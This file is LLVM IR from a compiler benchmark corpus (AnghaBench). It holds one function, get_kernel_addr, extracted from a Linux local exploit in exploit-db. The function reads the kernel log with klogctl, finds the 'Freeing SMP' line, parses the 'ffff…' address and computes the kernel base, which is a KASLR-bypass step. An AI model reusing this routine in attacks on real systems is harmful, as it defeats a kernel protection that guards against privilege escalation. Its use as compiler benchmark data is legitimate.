; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41994.c_get_kernel_addr.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41994.c_get_kernel_addr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SYSLOG_ACTION_SIZE_BUFFER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@SYSLOG_ACTION_READ_ALL = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [36 x i8] c"[-] klogctl(SYSLOG_ACTION_READ_ALL)\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"Freeing SMP\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [39 x i8] c"[-] substring '%s' not found in dmesg\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"ffff\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @get_kernel_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = load i32, i32* @SYSLOG_ACTION_SIZE_BUFFER, align 4
  %9 = call i32 @klogctl(i32 %8, i8* null, i32 0)
  store i32 %9, i32* %1, align 4
  %10 = load i32, i32* %1, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %16

12:                                               ; preds = %0
  %13 = call i32 @perror(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* @EXIT_FAILURE, align 4
  %15 = call i32 @exit(i32 %14) #3
  unreachable

16:                                               ; preds = %0
  %17 = load i32, i32* %1, align 4
  %18 = call i32 (...) @getpagesize()
  %19 = sdiv i32 %17, %18
  %20 = add nsw i32 %19, 1
  %21 = call i32 (...) @getpagesize()
  %22 = mul nsw i32 %20, %21
  store i32 %22, i32* %1, align 4
  %23 = load i32, i32* %1, align 4
  %24 = load i32, i32* @PROT_READ, align 4
  %25 = load i32, i32* @PROT_WRITE, align 4
  %26 = or i32 %24, %25
  %27 = load i32, i32* @MAP_PRIVATE, align 4
  %28 = load i32, i32* @MAP_ANONYMOUS, align 4
  %29 = or i32 %27, %28
  %30 = call i64 @mmap(i32* null, i32 %23, i32 %26, i32 %29, i32 -1, i32 0)
  %31 = inttoptr i64 %30 to i8*
  store i8* %31, i8** %2, align 8
  %32 = load i32, i32* @SYSLOG_ACTION_READ_ALL, align 4
  %33 = load i8*, i8** %2, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 0
  %35 = load i32, i32* %1, align 4
  %36 = call i32 @klogctl(i32 %32, i8* %34, i32 %35)
  store i32 %36, i32* %1, align 4
  %37 = load i32, i32* %1, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %43

39:                                               ; preds = %16
  %40 = call i32 @perror(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %41 = load i32, i32* @EXIT_FAILURE, align 4
  %42 = call i32 @exit(i32 %41) #3
  unreachable

43:                                               ; preds = %16
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8** %3, align 8
  %44 = load i8*, i8** %2, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 0
  %46 = load i32, i32* %1, align 4
  %47 = load i8*, i8** %3, align 8
  %48 = load i8*, i8** %3, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = call i64 @memmem(i8* %45, i32 %46, i8* %47, i32 %49)
  %51 = inttoptr i64 %50 to i8*
  store i8* %51, i8** %4, align 8
  %52 = load i8*, i8** %4, align 8
  %53 = icmp eq i8* %52, null
  br i1 %53, label %54, label %60

54:                                               ; preds = %43
  %55 = load i32, i32* @stderr, align 4
  %56 = load i8*, i8** %3, align 8
  %57 = call i32 @fprintf(i32 %55, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0), i8* %56)
  %58 = load i32, i32* @EXIT_FAILURE, align 4
  %59 = call i32 @exit(i32 %58) #3
  unreachable

60:                                               ; preds = %43
  store i32 0, i32* %1, align 4
  br label %61

61:                                               ; preds = %70, %60
  %62 = load i8*, i8** %4, align 8
  %63 = load i32, i32* %1, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = icmp ne i32 %67, 10
  br i1 %68, label %69, label %73

69:                                               ; preds = %61
  br label %70

70:                                               ; preds = %69
  %71 = load i32, i32* %1, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %1, align 4
  br label %61

73:                                               ; preds = %61
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8** %5, align 8
  %74 = load i8*, i8** %4, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 0
  %76 = load i32, i32* %1, align 4
  %77 = load i8*, i8** %5, align 8
  %78 = load i8*, i8** %5, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = call i64 @memmem(i8* %75, i32 %76, i8* %77, i32 %79)
  %81 = inttoptr i64 %80 to i8*
  store i8* %81, i8** %4, align 8
  %82 = load i8*, i8** %4, align 8
  %83 = icmp eq i8* %82, null
  br i1 %83, label %84, label %90

84:                                               ; preds = %73
  %85 = load i32, i32* @stderr, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = call i32 @fprintf(i32 %85, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0), i8* %86)
  %88 = load i32, i32* @EXIT_FAILURE, align 4
  %89 = call i32 @exit(i32 %88) #3
  unreachable

90:                                               ; preds = %73
  %91 = load i8*, i8** %4, align 8
  %92 = getelementptr inbounds i8, i8* %91, i64 16
  store i8* %92, i8** %6, align 8
  %93 = load i8*, i8** %4, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 0
  %95 = call i64 @strtoul(i8* %94, i8** %6, i32 16)
  store i64 %95, i64* %7, align 8
  %96 = load i64, i64* %7, align 8
  %97 = and i64 %96, -1048576
  store i64 %97, i64* %7, align 8
  %98 = load i64, i64* %7, align 8
  %99 = sub i64 %98, 16777216
  store i64 %99, i64* %7, align 8
  %100 = load i64, i64* %7, align 8
  ret i64 %100
}

declare dso_local i32 @klogctl(i32, i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getpagesize(...) #1

declare dso_local i64 @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i64 @memmem(i8*, i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i64 @strtoul(i8*, i8**, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
